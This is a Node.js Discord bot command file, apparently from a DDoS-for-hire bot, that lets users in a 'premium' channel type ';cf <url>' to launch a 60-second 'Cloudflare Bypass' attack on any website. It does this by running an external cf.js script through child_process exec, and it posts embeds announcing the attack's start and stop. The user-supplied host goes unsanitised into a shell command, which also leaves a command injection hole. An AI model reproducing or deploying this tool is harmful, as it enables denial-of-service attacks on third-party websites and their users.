const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../premium.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex: ;cf https://example.com/`")
	.setFooter("Please don't attack website .gov/.edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node cf.js ${host} 60`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**► Attack Stop 💥**")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**User**: `PREMIUM ☭` \n **Host**: `" + host + "` \n **Method**: `Cloudflare Bypass 💥` \n **Time**: `60 seconds 🕒`")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['cf'],
  permLevel: 0
}

exports.help = {
  name: 'cf',
  description: 'Mac',
  usage: 'cf'
}